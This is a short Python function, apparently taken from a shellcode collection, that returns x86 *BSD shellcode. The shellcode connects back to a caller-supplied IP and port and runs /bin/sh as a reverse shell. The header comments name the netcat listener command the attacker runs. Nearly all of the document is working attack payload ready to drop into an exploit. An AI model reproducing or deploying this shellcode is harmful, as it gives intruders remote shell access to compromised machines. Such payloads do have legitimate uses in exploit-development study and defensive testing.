#(http://shell-storm.org/shellcode/files/shellcode-676.php)
# reverse-portshell *BSD shellcode by noir       */
# local usage: ./reverse-shell 192.168.2.33      */
# remote:  nc -n -v -v -l -p 6969                */ 
# listen on 6969/tcp				  */
# noir@gsu.linux.org.tr			  */


def netcatreverse( IP,PORT):
	shellcode =  r"\x31\xc9\x51\x41"    
	shellcode += r"\x51\x41\x51\x51"
	shellcode += r"\x31\xc0\xb0\x61"
	shellcode += r"\xcd\x80\x89\x07"
	shellcode += r"\x31\xc9\x88\x4f"
	shellcode += r"\x04\xc6\x47\x05"
	shellcode += r"\x02\xc7\x47\x08"
	shellcode += IP
	#0xc0,0xa8,0x01,0x45, //IP
	shellcode += r"\x66\xc7\x47\x06"   
	shellcode += PORT
	#0x1b,0x39            //PORT
	shellcode += r"\x6a\x10"
	shellcode += r"\x8d\x47\x04\x50"
	shellcode += r"\x8b\x07\x50\x50"
	shellcode += r"\x31\xc0\xb0\x62"   
	shellcode += r"\xcd\x80\x31\xc9"
	shellcode += r"\x51\x8b\x07\x50"   
	shellcode += r"\x50\x31\xc0\xb0"
	shellcode += r"\x5a\xcd\x80\x41"   
	shellcode += r"\x83\xf9\x03\x75"
	shellcode += r"\xef\x31\xc9\x51"   
	shellcode += r"\x51\x31\xc0\xb0"
	shellcode += r"\x17\xcd\x80\xeb"   
	shellcode += r"\x23\x5b\x89\x1f"
	shellcode += r"\x31\xc9\x88\x4b"   
	shellcode += r"\x07\x89\x4f\x04"
	shellcode += r"\x51\x8d\x07\x50"   
	shellcode += r"\x8b\x07\x50\x50"
	shellcode += r"\x31\xc0\xb0\x3b"   
	shellcode += r"\xcd\x80\x31\xc9"
	shellcode += r"\x51\x51\x31\xc0"   
	shellcode += r"\xb0\x01\xcd\x80"
	shellcode += r"\xe8\xd8\xff\xff"   
	shellcode += r"\xff\x2f\x62\x69"
	shellcode += r"\x6e\x2f\x73\x68"  
	shellcode += r"\x41"
	return shellcode